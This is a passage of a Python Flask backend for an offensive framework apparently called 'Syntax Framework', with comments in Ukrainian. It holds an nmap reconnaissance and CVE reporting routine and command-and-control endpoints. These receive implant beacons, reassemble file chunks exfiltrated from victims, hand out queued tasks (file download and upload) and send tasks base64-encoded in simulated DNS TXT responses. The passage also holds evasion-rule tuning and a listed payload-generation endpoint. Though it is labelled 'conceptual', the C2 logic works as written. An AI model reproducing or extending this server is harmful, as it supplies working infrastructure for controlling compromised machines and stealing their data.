                                    for k, v in script_info['structured_data'].items():
                                        report_lines.append(f"      {k}: {v}")
                                if script_info['tables']:
                                    for table_idx, table_item in enumerate(script_info['tables']):
                                        report_lines.append(f"      Table {table_idx+1}:")
                                        for k, v in table_item.items():
                                            report_lines.append(f"        {k}: {v}")
                        report_lines.append("") # Порожній рядок між хостами/ОС
                else:
                    report_lines.append("OS information or host scripts not found or could not be parsed.")
                report_lines.append("")

                # Інформація про сервіси, CVE та скрипти портів
                report_lines.append("--- Open Ports, Services, Scripts & CVEs ---")
                if parsed_services_nmap:
                    cve_log_additions_local = []
                    cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local)
                    recon_log_additions.extend(cve_log_additions_local)
                    
                    for service in parsed_services_nmap:
                        report_lines.append(f"Port: {service.get('port')}/{service.get('protocol')} on {service.get('host_ip', target)}")
                        report_lines.append(f"  Service: {service.get('service_name')}")
                        if service.get('product'): report_lines.append(f"  Product: {service.get('product','')}")
                        if service.get('version_number'): report_lines.append(f"  Version: {service.get('version_number','')}")
                        if service.get('extrainfo'): report_lines.append(f"  ExtraInfo: {service.get('extrainfo')}")
                        if service.get('cpes'): report_lines.append(f"  Service CPEs: {', '.join(service.get('cpes'))}")
                        
                        # Концептуальні CVE
                        service_cves_found = [cve for cve in cve_results_local if cve.get('port') == service.get('port') and cve.get('host_ip', service.get('host_ip')) == service.get('host_ip')] # Додано перевірку host_ip
                        if service_cves_found:
                            report_lines.append("  Conceptual CVEs (Local DB):")
                            for cve in service_cves_found:
                                report_lines.append(f"    - {cve['cve_id']} (Severity: {cve['severity']})")
                                report_lines.append(f"      Summary: {cve['summary']}")
                        
                        # Вивід скриптів для порту
                        if service.get("scripts"):
                            report_lines.append("  Port Scripts Output:")
                            for script_info in service["scripts"]:
                                report_lines.append(f"    Script ID: {script_info['id']}")
                                if script_info['output']:
                                    # Спроба витягти CVE з виводу скрипту vulners
                                    if script_info['id'] == 'vulners':
                                        vulners_output_lines = script_info['output'].strip().split('\n')
                                        report_lines.append("      Vulners Scan Details:")
                                        for line in vulners_output_lines:
                                            line_stripped = line.strip()
                                            if line_stripped: # Не додавати порожні рядки
                                                report_lines.append(f"        {line_stripped}")
                                    else:
                                         report_lines.append(f"      Raw Output: {script_info['output'].strip()}")
                                if script_info['structured_data']:
                                    report_lines.append("      Structured Data:")
                                    for k, v in script_info['structured_data'].items():
                                        report_lines.append(f"        {k}: {v}")
                                if script_info['tables']:
                                    for table_idx, table_item in enumerate(script_info['tables']):
                                        report_lines.append(f"      Table {table_idx+1}:")
                                        for k, v in table_item.items():
                                            report_lines.append(f"          {k}: {v}")
                        report_lines.append("") # Порожній рядок між сервісами
                else:
                    report_lines.append("Services for analysis not found or Nmap scan failed before service parsing.")
                
                if recon_type == "port_scan_nmap_vuln_scripts":
                     report_lines.append("\n--- Raw Nmap XML Output (for detailed analysis) ---")
                     report_lines.append(nmap_xml_data if nmap_xml_data.strip() else "Nmap did not produce XML output or it was empty.")

            recon_results_text = "\n".join(report_lines)
        else:
            return jsonify({"success": False, "error": f"Unknown recon_type: {recon_type}", "reconLog": "\n".join(log_messages+[f"[BE_ERR] Unknown type: {recon_type}"]) }), 400

        log_messages.extend(recon_log_additions)
        time.sleep(0.1)
        log_messages.append("[BACKEND_SUCCESS] Розвідка завершена.")
        return jsonify({"success": True, "reconResults": recon_results_text, "reconLog": "\n".join(log_messages)}), 200
    except Exception as e:
        print(f"SERVER ERROR (run_recon): {str(e)}"); import traceback; traceback.print_exc()
        log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error during recon", "reconLog": "\n".join(log_messages)}), 500

@app.route('/api/c2/beacon_receiver', methods=['POST'])
def handle_c2_beacon():
    # ... (Код без змін від v1.9.5) ...
    log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    global pending_tasks_for_implants, simulated_implants_be, exfiltrated_file_chunks_db
    try:
        beacon_data = request.get_json()
        if not beacon_data:
            log_messages_c2_beacon.append("[C2_BEACON_ERROR] Не отримано JSON даних маячка.")
            return jsonify({"success": False, "error": "No JSON beacon data", "log": "\n".join(log_messages_c2_beacon)}), 400
        implant_id_from_beacon = beacon_data.get("implant_id")
        hostname_from_beacon = beacon_data.get("hostname", "N/A")
        log_messages_c2_beacon.append(f"[C2_BEACON_RECEIVED] Отримано маячок від ID: {implant_id_from_beacon}, Hostname: {hostname_from_beacon}")
        last_task_id_received = beacon_data.get("last_task_id")
        last_task_result_received = beacon_data.get("last_task_result")
        task_success_received = beacon_data.get("task_success")
        if last_task_id_received: log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
        file_exfil_chunk_data = beacon_data.get("file_exfil_chunk")
        if file_exfil_chunk_data and last_task_id_received:
            file_path = file_exfil_chunk_data.get("file_path")
            chunk_num = file_exfil_chunk_data.get("chunk_num")
            total_chunks = file_exfil_chunk_data.get("total_chunks")
            data_b64 = file_exfil_chunk_data.get("data_b64")
            is_final_chunk = file_exfil_chunk_data.get("is_final", False)
            file_key = f"{implant_id_from_beacon}_{last_task_id_received}_{file_path}"
            if file_key not in exfiltrated_file_chunks_db:
                exfiltrated_file_chunks_db[file_key] = {"file_path": file_path, "task_id": last_task_id_received, "total_chunks": total_chunks, "received_chunks": {}, "implant_id": implant_id_from_beacon, "first_seen": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            if data_b64:
                 exfiltrated_file_chunks_db[file_key]["received_chunks"][chunk_num] = data_b64
                 log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
            if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
                log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
                # Тут можна було б зібрати файл, але для симуляції просто видаляємо запис
                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key] # Видаляємо, щоб не накопичувати
        elif beacon_data.get("file_exfil_error"): log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
        implant_found_in_list = False
        for implant in simulated_implants_be:
            if implant["id"] == implant_id_from_beacon:
                implant["lastSeen"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                implant["status"] = "active_beaconing"
                implant_found_in_list = True
                log_messages_c2_beacon.append(f"[C2_BEACON_UPDATE] Оновлено lastSeen та статус для імпланта {implant_id_from_beacon}.")
                break
        if not implant_found_in_list:
            log_messages_c2_beacon.append(f"[C2_BEACON_WARN] Маячок від невідомого ID імпланта: {implant_id_from_beacon}. Додавання до списку.")
            new_implant_data = {"id": implant_id_from_beacon, "ip": request.remote_addr, "os": beacon_data.get("os_type", "Unknown from beacon"), "lastSeen": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "status": "active_beaconing_new", "files": [], "beacon_interval_sec": beacon_data.get("beacon_interval_sec", 60)}
            simulated_implants_be.append(new_implant_data)
            simulated_implants_be.sort(key=lambda x: x["id"])
        next_task_to_assign = None
        if implant_id_from_beacon in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_beacon]:
            next_task_to_assign = pending_tasks_for_implants[implant_id_from_beacon].pop(0)
            if not pending_tasks_for_implants[implant_id_from_beacon]: del pending_tasks_for_implants[implant_id_from_beacon]
            log_messages_c2_beacon.append(f"[C2_TASK_ISSUED] Видано завдання '{next_task_to_assign.get('task_id')}' ({next_task_to_assign.get('task_type')}) для імпланта {implant_id_from_beacon}.")
        c2_response_to_implant = {"status": "OK", "next_task": next_task_to_assign, "message": "Beacon received by Syntax C2."}
        if next_task_to_assign: c2_response_to_implant["message"] += f" Task '{next_task_to_assign.get('task_id')}' issued."
        log_messages_c2_beacon.append(f"[C2_BEACON_RESPONSE] Відповідь на маячок: {json.dumps(c2_response_to_implant)}")
        return jsonify({"success": True, "c2_response": c2_response_to_implant, "log": "\n".join(log_messages_c2_beacon)}), 200
    except Exception as e:
        print(f"SERVER ERROR (c2_beacon_receiver): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_c2_beacon.append(f"[C2_BEACON_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error processing beacon", "log": "\n".join(log_messages_c2_beacon)}), 500

@app.route('/api/c2/dns_resolver_sim', methods=['GET'])
def handle_dns_resolver_sim():
    # ... (Код без змін від v1.9.5) ...
    log_messages_dns_sim = [f"[C2_DNS_SIM v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        query_hostname = request.args.get('q')
        implant_id_from_dns_req = request.args.get('id')
        log_messages_dns_sim.append(f"[C2_DNS_SIM_RECEIVED] Отримано DNS-запит (симуляція): q='{query_hostname}', id='{implant_id_from_dns_req}'.")
        if not query_hostname or not implant_id_from_dns_req:
            return jsonify({"success": False, "error": "Missing query or implant ID in DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 400
        
        # Проста логіка: якщо є завдання для цього імпланта, кодуємо його в TXT-подібну відповідь
        next_task_dns = None
        if implant_id_from_dns_req in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_dns_req]:
            next_task_dns = pending_tasks_for_implants[implant_id_from_dns_req].pop(0) # Беремо перше завдання
            if not pending_tasks_for_implants[implant_id_from_dns_req]:
                del pending_tasks_for_implants[implant_id_from_dns_req] # Видаляємо, якщо черга порожня
            log_messages_dns_sim.append(f"[C2_DNS_SIM_TASK_FOUND] Знайдено завдання для {implant_id_from_dns_req}: {next_task_dns.get('task_id')}")
        
        response_payload = {"message": "DNS query processed by Syntax C2 Simulator."}
        if next_task_dns:
            task_json_str = json.dumps(next_task_dns)
            task_b64_str = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8')
            response_payload["dns_txt_response_payload"] = task_b64_str # Імітація TXT запису з завданням
            response_payload["task_data"] = next_task_dns # Для зручності налагодження, можна прибрати в продакшені
            log_messages_dns_sim.append(f"[C2_DNS_SIM_RESPONSE_WITH_TASK] Відповідь з завданням (B64): {task_b64_str[:50]}...")
        else:
            log_messages_dns_sim.append("[C2_DNS_SIM_RESPONSE_NO_TASK] Відповідь без нового завдання.")

        return jsonify({"success": True, **response_payload, "log": "\n".join(log_messages_dns_sim)}), 200
    except Exception as e:
        print(f"SERVER ERROR (dns_resolver_sim): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_dns_sim.append(f"[C2_DNS_SIM_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error processing DNS sim request", "log": "\n".join(log_messages_dns_sim)}), 500


@app.route('/api/c2/implants', methods=['GET'])
def get_c2_implants():
    # ... (Код без змін від v1.9.5) ...
    global simulated_implants_be
    log_messages_c2_get_implants = [f"[C2_GET_IMPLANTS v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        # Оновлення статусу імплантів, якщо вони давно не виходили на зв'язок
        current_time = time.time()
        for implant in simulated_implants_be:
            try:
                last_seen_dt = datetime.strptime(implant["lastSeen"], '%Y-%m-%d %H:%M:%S')
                if current_time - last_seen_dt.timestamp() > (implant.get("beacon_interval_sec", 60) * 5): # 5 інтервалів маячка
                    implant["status"] = "offline_timeout"
            except ValueError: # Якщо дата в неправильному форматі
                 implant["status"] = "offline_unknown_lastseen"

        log_messages_c2_get_implants.append(f"[C2_GET_IMPLANTS_INFO] Повернення {len(simulated_implants_be)} імітованих імплантів.")
        return jsonify({"success": True, "implants": simulated_implants_be, "log": "\n".join(log_messages_c2_get_implants)}), 200
    except Exception as e:
        print(f"SERVER ERROR (get_c2_implants): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_c2_get_implants.append(f"[C2_GET_IMPLANTS_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error retrieving implants", "log": "\n".join(log_messages_c2_get_implants)}), 500

@app.route('/api/c2/task', methods=['POST'])
def handle_c2_task():
    # ... (Код без змін від v1.9.5) ...
    log_messages_c2_task = [f"[C2_TASK_HANDLER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    global pending_tasks_for_implants
    try:
        task_data = request.get_json()
        if not task_data:
            log_messages_c2_task.append("[C2_TASK_ERROR] Не отримано JSON даних завдання.")
            return jsonify({"success": False, "error": "No JSON task data", "log": "\n".join(log_messages_c2_task)}), 400

        implant_id = task_data.get("implant_id")
        task_type = task_data.get("task_type")
        task_params = task_data.get("task_params", "") # Може бути рядком або словником для upload_file_b64
        queue_task_flag = task_data.get("queue_task", True) # За замовчуванням ставимо в чергу

        log_messages_c2_task.append(f"[C2_TASK_RECEIVED] Отримано завдання для ID: {implant_id}, Тип: {task_type}, Параметри: {str(task_params)[:100]}..., Черга: {queue_task_flag}")

        if not implant_id or not task_type:
            log_messages_c2_task.append("[C2_TASK_ERROR] Відсутній ID імпланта або тип завдання.")
            return jsonify({"success": False, "error": "Missing implant_id or task_type", "log": "\n".join(log_messages_c2_task)}), 400

        # Перевірка, чи існує такий імплант (хоча б у симуляції)
        if not any(imp['id'] == implant_id for imp in simulated_implants_be):
            log_messages_c2_task.append(f"[C2_TASK_WARN] Спроба поставити завдання для невідомого імпланта ID: {implant_id}.")
            # Можна повернути помилку, або все одно додати до черги, якщо очікується, що імплант з'явиться
            # return jsonify({"success": False, "error": f"Implant ID {implant_id} not found.", "log": "\n".join(log_messages_c2_task)}), 404


        new_task_id = f"TASK-{uuid.uuid4().hex[:8].upper()}"
        task_to_queue = {
            "task_id": new_task_id,
            "task_type": task_type,
            "task_params": task_params, # Зберігаємо як є (рядок або словник)
            "timestamp_created": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

        if implant_id not in pending_tasks_for_implants:
            pending_tasks_for_implants[implant_id] = []
        
        pending_tasks_for_implants[implant_id].append(task_to_queue)
        log_messages_c2_task.append(f"[C2_TASK_QUEUED] Завдання {new_task_id} ({task_type}) додано до черги для імпланта {implant_id}.")
        
        # Оновлення статусу імпланта, якщо він є
        for implant_entry in simulated_implants_be:
            if implant_entry["id"] == implant_id:
                implant_entry["status"] = "task_pending"
                break
        
        return jsonify({
            "success": True, 
            "message": f"Task {new_task_id} ({task_type}) queued for implant {implant_id}.",
            "queued_task": task_to_queue,
            "log": "\n".join(log_messages_c2_task)
        }), 200

    except Exception as e:
        print(f"SERVER ERROR (handle_c2_task): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_c2_task.append(f"[C2_TASK_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error processing task", "log": "\n".join(log_messages_c2_task)}), 500

@app.route('/api/operational_data', methods=['GET'])
def get_operational_data():
    # ... (Код без змін від v1.9.5) ...
    log_messages_op_data = [f"[OPERATIONAL_DATA v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        sim_logs = generate_simulated_operational_logs_be()
        sim_stats = get_simulated_stats_be()
        
        # Додамо лог про отримані файли/чанки, якщо є
        if exfiltrated_file_chunks_db:
            for file_key, file_info in list(exfiltrated_file_chunks_db.items()): # list() для копії, якщо будемо видаляти
                num_received = len(file_info.get("received_chunks", {}))
                total_chunks = file_info.get("total_chunks", "N/A")
                sim_logs.append({
                    "timestamp": file_info.get("first_seen", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
                    "level": "INFO",
                    "component": "C2_Exfil_Monitor_BE",
                    "message": f"Exfiltrating '{file_info.get('file_path')}' from {file_info.get('implant_id')}. Received {num_received}/{total_chunks} chunks. Task ID: {file_info.get('task_id')}."
                })
        sim_logs.sort(key=lambda x: x["timestamp"], reverse=True) # Найновіші спочатку

        log_messages_op_data.append("[OPERATIONAL_DATA_INFO] Згенеровано симульовані логи та статистику.")
        return jsonify({
            "success": True, 
            "aggregatedLogs": sim_logs[:30], # Обмеження до 30 останніх логів
            "statistics": sim_stats,
            "log": "\n".join(log_messages_op_data)
        }), 200
    except Exception as e:
        print(f"SERVER ERROR (get_operational_data): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_op_data.append(f"[OPERATIONAL_DATA_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error retrieving operational data", "log": "\n".join(log_messages_op_data)}), 500

@app.route('/api/framework_rules', methods=['POST'])
def update_framework_rules():
    # ... (Код без змін від v1.9.5) ...
    log_messages_rules = [f"[FRAMEWORK_RULES v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        data = request.get_json()
        if not data:
            log_messages_rules.append("[RULES_ERROR] Не отримано JSON даних.")
            return jsonify({"success": False, "error": "No JSON data for rules", "log": "\n".join(log_messages_rules)}), 400

        auto_adapt = data.get("auto_adapt_rules", False)
        rule_id_to_update = data.get("rule_id")
        new_value_for_rule = data.get("new_value")

        log_messages_rules.append(f"[RULES_INFO] Отримано запит на оновлення правил. Авто-адаптація: {auto_adapt}, ID правила: '{rule_id_to_update}', Нове значення: '{new_value_for_rule}'.")
        
        # Тут мала б бути реальна логіка оновлення правил фреймворку.
        # Для симуляції просто логуємо та повертаємо успіх.
        
        # Приклад симуляції зміни якогось параметра на основі вхідних даних
        if rule_id_to_update == "EVASION_TECHNIQUE_XOR_PRIORITY":
            try:
                new_priority = float(new_value_for_rule)
                # Тут можна було б оновити якусь глобальну змінну, що впливає на генерацію
                log_messages_rules.append(f"[RULES_SIM_UPDATE] Пріоритет техніки XOR (симуляція) змінено на {new_priority}.")
            except ValueError:
                log_messages_rules.append(f"[RULES_SIM_WARN] Не вдалося перетворити '{new_value_for_rule}' на float для пріоритету XOR.")

        if auto_adapt:
            log_messages_rules.append("[RULES_SIM_AUTO_ADAPT] Режим автоматичної адаптації (симуляція) увімкнено. Фреймворк 'аналізує' дані для майбутніх оптимізацій.")
            # Тут могла б бути логіка, що аналізує статистику та логи для прийняття рішень
            # Наприклад, якщо statsDetectionRate високий, збільшити інтенсивність метаморфізму.

        message_to_user = f"Правила фреймворку (концептуально) оновлено. ID: '{rule_id_to_update}', Нове значення: '{new_value_for_rule}'. Авто-адаптація: {auto_adapt}."
        log_messages_rules.append(f"[RULES_SUCCESS] {message_to_user}")
        
        return jsonify({"success": True, "message": message_to_user, "log": "\n".join(log_messages_rules)}), 200
    except Exception as e:
        print(f"SERVER ERROR (update_framework_rules): {str(e)}"); import traceback; traceback.print_exc()
        log_messages_rules.append(f"[RULES_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error updating framework rules", "log": "\n".join(log_messages_rules)}), 500


if __name__ == '__main__':
    print("="*60)
    print(f"Syntax Framework - Концептуальний Backend v{VERSION_BACKEND}")
    print("Запуск Flask-сервера на http://localhost:5000")
    print("Доступні ендпоінти:")
    print("  POST /api/generate_payload")
    print("  POST /api/run_recon (типи: port_scan_basic, osint_email_search, osint_subdomain_search_concept, port_scan_nmap_standard, port_scan_nmap_cve_basic, port_scan_nmap_vuln_scripts)")
    print("  GET  /api/c2/implants")
    print("  POST /api/c2/task  (включає 'download_file', 'upload_file_b64')")
    print("  POST /api/c2/beacon_receiver")
    print("  GET  /api/c2/dns_resolver_sim")
    print("  GET  /api/operational_data")
    print("  POST /api/framework_rules")
    print("Переконайтеся, що 'nmap' встановлено та доступно в PATH для використання Nmap-сканувань.")
    print("Для генерації .EXE пейлоадів, PyInstaller має бути встановлений та доступний в PATH.")
    print("Натисніть Ctrl+C для зупинки.")
    print("="*60)
    app.run(host='localhost', port=5000, debug=False)
    